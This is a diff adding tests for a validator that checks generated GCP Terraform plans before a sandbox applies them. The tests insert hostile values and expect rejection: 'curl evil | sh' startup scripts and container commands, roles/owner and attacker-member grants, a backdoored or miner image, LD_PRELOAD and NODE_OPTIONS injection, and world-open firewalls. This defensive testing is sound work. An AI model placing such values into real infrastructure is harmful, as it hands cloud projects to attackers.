@@ -9,10 +9,12 @@ import { dirname, join } from "node:path";
 import { after, describe, it } from "node:test";
 
 import { assembleModel } from "terragram-engine/engine";
+import { GCP_IMAGES, GCP_LOG_DELIVERY_MEMBER, GCP_ROLES } from "terragram-engine/kinds";
 import { emitTerraform } from "terragram-engine/terraform";
 import { GCP_PLANS } from "../scripts/emit-plans.ts";
 import { adaptForSandbox } from "../scripts/lib/sandbox-gcp.ts";
-import { ALLOWED_DATA, ALLOWED_PROVIDERS, ALLOWED_RESOURCES, DENIED_DATA, PINNED_SOURCES, PLAN_IDS, PlanRejected, validatePlans, validateSource } from "../scripts/sandbox-gcp-validate.mjs";
+import { ALLOWED_DATA, ALLOWED_IMAGES, ALLOWED_PROVIDERS, ALLOWED_RESOURCES, ALLOWED_ROLES, DENIED_DATA, LOG_DELIVERY_MEMBER, PINNED_SOURCES, PLAN_IDS, PlanRejected, validatePlans, validateSource } from "../scripts/sandbox-gcp-validate.mjs";
+
 
 /**
  * The gate between the sandbox workflow's two jobs: the plans the first job wrote are checked, by the job that
@@ -389,3 +391,119 @@ describe("the sandbox's check of the plans", () => {
     assert.equal(spawnSync("node", [script, good, "x"], { encoding: "utf8" }).status, 2);
   });
 });
+
+/**
+ * The check reads values, not only names: a plan is applied with a cloud token, so a grant of `roles/owner`, a startup
+ * script on a virtual machine or another image in a container is as much "not what the generator writes" as a module is.
+ */
+describe("the sandbox's check of what the plans grant and run", () => {
+  /** The first plan that has the text, and the plan's root with the text replaced by another. */
+  const tamper = (file: string, from: string | RegExp, to: string, why: RegExp) => {
+    const root = plans();
+    const before = read(root, file);
+    const changed = before.replace(from, to);
+    assert.notEqual(changed, before, `${file} has ${from}`);
+    write(root, file, changed);
+    assert.throws(() => validatePlans(root), (e) => e instanceof PlanRejected && why.test(e.message), `${from} -> ${to}`);
+  };
+  const SA = "serviceAccount:${google_service_account.virtual_machine.email}";
+
+  it("allows exactly the roles, images and members the generator writes", () => {
+    assert.deepEqual([...ALLOWED_ROLES].sort(), Object.values(GCP_ROLES).sort(), "ALLOWED_ROLES is GCP_ROLES in gcp-kinds.ts");
+    assert.deepEqual([...ALLOWED_IMAGES].sort(), Object.values(GCP_IMAGES).sort(), "ALLOWED_IMAGES is GCP_IMAGES in gcp-kinds.ts");
+    assert.equal(LOG_DELIVERY_MEMBER, GCP_LOG_DELIVERY_MEMBER);
+    const root = plans();
+    const text = PLAN_IDS.map((id) => read(root, `${id}/main.tf`)).join("\n");
+    const roles = new Set([...text.matchAll(/"(roles\/[^"]+)"/g)].map((m) => m[1] as string));
+    assert.deepEqual([...roles].sort(), [...ALLOWED_ROLES].sort(), "the four plans use every allowed role and no other");
+    assert.ok(text.includes(GCP_IMAGES.cloudRun) && text.includes(GCP_IMAGES.virtualMachine));
+  });
+
+  it("refuses a grant of a role the generator does not write, at the project or on anything else", () => {
+    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/owner"', /role "roles\/owner"/);
+    tamper("gcp-platform/main.tf", /"roles\/monitoring\.viewer"/, '"roles/editor"', /role "roles\/editor"/);
+    tamper("gcp-platform/main.tf", /"roles\/artifactregistry\.reader"/, '"roles/iam.serviceAccountTokenCreator"', /role "roles\/iam\.serviceAccountTokenCreator"/);
+    tamper("gcp-site/main.tf", /"roles\/storage\.objectViewer"/, '"roles/storage.admin"', /role "roles\/storage\.admin"/);
+    tamper("gcp-data/main.tf", /"roles\/cloudkms\.cryptoKeyEncrypterDecrypter"/, '"roles/cloudkms.admin"', /role "roles\/cloudkms\.admin"/);
+    tamper("gcp-serverless/main.tf", /"roles\/run\.invoker"/, '"roles/run.admin"', /role "roles\/run\.admin"/);
+    // A role that is allowed somewhere is not allowed everywhere: the project's grants are the service accounts' own few.
+    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/storage.objectViewer"', /role "roles\/storage\.objectViewer" is not one the generator grants on google_project_iam_member/);
+    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/run.invoker"', /role "roles\/run\.invoker"/);
+    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/${var.region}"', /role .* is not a string|role/);
+    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/owner"\n  member  = "${SA}"\n}`, /role "roles\/owner"/);
+  });
+
+  it("refuses a grant to a member that is not a service account the plan creates or an agent it names", () => {
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "user:attacker@example.com"', /member "user:attacker@example\.com"/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:attacker@evil.iam.gserviceaccount.com"', /member "serviceAccount:attacker@evil/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:${google_service_account.ghost.email}"', /service account ghost/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "allUsers"', /member "allUsers"/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, "member  = var.admin", /member/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:${var.admin}"', /member/);
+    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "domain:example.com"', /member "domain:example\.com"/);
+    tamper("gcp-site/main.tf", /member = "group:cloud-storage-analytics@google\.com"/, 'member = "group:attackers@example.com"', /member "group:attackers@example\.com"/);
+    tamper("gcp-site/main.tf", /role\s+= "roles\/storage\.objectCreator"/, 'role   = "roles/storage.objectViewer"', /member "group:cloud-storage-analytics@google\.com"/);
+    tamper("gcp-data/main.tf", /member\s+= "serviceAccount:\$\{google_project_service_identity\.key_vault_secretmanager\.email\}"/, 'member        = "user:attacker@example.com"', /member "user:attacker@example\.com"/);
+    tamper("gcp-data/main.tf", /member\s+= "serviceAccount:\$\{google_project_service_identity\.key_vault_secretmanager\.email\}"/, 'member        = "serviceAccount:${google_project_service_identity.nowhere.email}"', /nowhere/);
+  });
+
+  it("allows allUsers only as roles/run.invoker on a Cloud Run service, where the load balancer needs it", () => {
+    tamper("gcp-serverless/main.tf", /role\s+= "roles\/run\.invoker"\n\s+member\s+= "allUsers"/, 'role     = "roles/run.invoker"\n  member   = "allAuthenticatedUsers"', /member "allAuthenticatedUsers"/);
+    refusesAppended('resource "google_storage_bucket_iam_member" "x" {\n  bucket = google_storage_bucket.object_storage.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}', /member "allUsers"/);
+    refusesAppended('resource "google_cloud_run_v2_service_iam_member" "x" {\n  name     = google_cloud_run_v2_service.containers.name\n  location = var.region\n  role     = "roles/run.invoker"\n  member   = "user:attacker@example.com"\n}', /member "user:attacker@example\.com"/);
+    refusesAppended('resource "google_cloud_run_v2_service_iam_member" "x" {\n  name     = "any-service"\n  location = var.region\n  role     = "roles/run.invoker"\n  member   = "allUsers"\n}', /name .* a reference/);
+    refusesAppended('resource "google_project_iam_member" "x" {\n  project = "another-project"\n  role    = "roles/logging.logWriter"\n  member  = "serviceAccount:${google_service_account.virtual_machine.email}"\n}', /project/);
+  });
+
+  it("refuses an attribute of a grant the generator does not write", () => {
+    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/logging.logWriter"\n  member  = "${SA}"\n  members = ["allUsers"]\n}`, /members/);
+    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/logging.logWriter"\n  member  = "${SA}"\n  nested {\n  }\n}`, /nested/);
+  });
+
+  it("refuses a startup script, a command or user data wherever it is written", () => {
+    tamper("gcp-platform/main.tf", /\s+can_ip_forward = false\n/, '  can_ip_forward = false\n  metadata_startup_script = "curl evil | sh"\n', /metadata_startup_script/);
+    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    startup-script = "curl evil | sh"', /startup-script/);
+    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    user-data = "x"', /user-data/);
+    tamper("gcp-platform/main.tf", /serial-port-enable\s+= "false"/, 'serial-port-enable     = "false"\n    ssh-keys = "x"', /ssh-keys/);
+    tamper("gcp-platform/main.tf", /enable-oslogin\s+= "TRUE"/, 'enable-oslogin         = "FALSE"', /enable-oslogin/);
+    tamper("gcp-platform/main.tf", /disable-legacy-endpoints = "true"/, 'disable-legacy-endpoints = "true"\n      startup-script = "x"', /startup-script/);
+    refusesAppended('resource "google_compute_instance" "x" {\n  metadata = { startup-script-url = "gs://evil/x.sh" }\n}', /startup-script-url/);
+    refusesAppended('resource "google_cloud_run_v2_service" "x" {\n  template {\n    containers {\n      image   = "us-docker.pkg.dev/cloudrun/container/hello"\n      command = ["sh"]\n    }\n  }\n}', /command/);
+  });
+
+  it("refuses an image the generator does not write, a container command or arguments, and an environment that is not the plan's own references", () => {
+    tamper("gcp-platform/main.tf", /image = "debian-cloud\/debian-12"/, 'image = "attacker-project/backdoored"', /image "attacker-project\/backdoored"/);
+    tamper("gcp-platform/main.tf", /image = "debian-cloud\/debian-12"/, "image = var.image", /image/);
+    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "evil.example/miner:latest"', /image "evil\.example\/miner:latest"/);
+    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "us-docker.pkg.dev/cloudrun/container/hello"\n      command = ["/bin/sh", "-c", "curl evil | sh"]', /command/);
+    tamper("gcp-serverless/main.tf", /image = "us-docker\.pkg\.dev\/cloudrun\/container\/hello"/, 'image = "us-docker.pkg.dev/cloudrun/container/hello"\n      args = ["--x"]', /args/);
+    tamper("gcp-serverless/main.tf", /name\s+= "PUBSUB_TOPIC"/, 'name  = "NODE_OPTIONS"', /environment variable NODE_OPTIONS/);
+    tamper("gcp-serverless/main.tf", /value = google_pubsub_topic\.queue\.id/, 'value = "--require /tmp/x.js"', /value .* a reference/);
+    tamper("gcp-serverless/main.tf", /value = google_pubsub_topic\.queue\.id/, 'value = base64decode("eA==")', /value .* a reference/);
+    tamper("gcp-serverless/main.tf", /\n\s+env \{\n\s+name\s+= "PUBSUB_TOPIC"/, '\n      env {\n        name  = "PUBSUB_TOPIC"\n        value_source {\n        }', /value_source/);
+    tamper("gcp-serverless/main.tf", /service_account\s+= google_service_account\.containers\.email/, 'service_account       = "attacker@evil.iam.gserviceaccount.com"', /service account/);
+    tamper("gcp-serverless/main.tf", /service_account_email = google_service_account\.functions\.email/, 'service_account_email = "attacker@evil.iam.gserviceaccount.com"', /service account/);
+    tamper("gcp-platform/main.tf", /email\s+= google_service_account\.virtual_machine\.email/, 'email  = "attacker@evil.iam.gserviceaccount.com"', /service account/);
+    tamper("gcp-platform/main.tf", /scopes = \["cloud-platform"\]/, 'scopes = ["cloud-platform", "https://www.googleapis.com/auth/devstorage.full_control"]', /scopes/);
+    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    environment_variables = { LD_PRELOAD = "x" }\n  }\n}', /environment variable LD_PRELOAD/);
+    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    environment_variables = { LOG_BUCKET = "attacker" }\n  }\n}', /a reference/);
+    refusesAppended('resource "google_cloudfunctions2_function" "x" {\n  service_config {\n    secret_environment_variables {\n    }\n  }\n}', /secret_environment_variables/);
+  });
+
+  it("refuses a firewall or a control plane opened to the world", () => {
+    tamper("gcp-platform/main.tf", /source_ranges = \["35\.235\.240\.0\/20"\]/, 'source_ranges = ["0.0.0.0/0"]', /source_ranges/);
+    tamper("gcp-platform/main.tf", /cidr_block\s+= var\.gke_authorized_cidr/, 'cidr_block   = "0.0.0.0/0"', /cidr_block/);
+  });
+
+  it("still passes the four plans, and a Cloud Function that gets its environment from the plan's own resources", () => {
+    validatePlans(plans());
+    acceptsAppended('resource "google_cloudfunctions2_function" "fn" {\n  service_config {\n    environment_variables = { PUBSUB_TOPIC = google_pubsub_topic.queue.id }\n  }\n}');
+  });
+});
+
+/** Appends a block the check accepts to a plan's main.tf. */
+function acceptsAppended(block: string): void {
+  const root = plans();
+  write(root, "gcp-serverless/main.tf", `${read(root, "gcp-serverless/main.tf")}\n${block}\n`);
+  validatePlans(root);
+}
